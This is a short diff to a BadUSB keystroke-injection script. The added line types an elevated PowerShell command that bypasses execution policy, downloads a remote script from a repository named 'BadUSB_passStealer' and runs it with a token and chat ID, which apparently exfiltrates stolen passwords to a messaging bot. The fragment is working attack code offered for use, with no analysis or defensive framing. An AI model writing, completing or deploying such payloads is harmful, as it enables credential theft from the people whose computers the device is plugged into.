@@ -34,7 +34,7 @@ GUI r
 DELAY 500
 
 REM Execute PowerShell hidden with administrative privileges
-STRING powershell -w h -NoP -Ep Bypass -Command "irm <LINK> | iex"
+STRING powershell -NoP -Ep Bypass -Command "$script = [ScriptBlock]::Create((irm 'https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/refs/heads/main/ps.ps1')); & $script -Token 'TOKEN' -ChatID 'CHAT_ID'"
 CTRL-SHIFT ENTER
 DELAY 1000
 LEFT
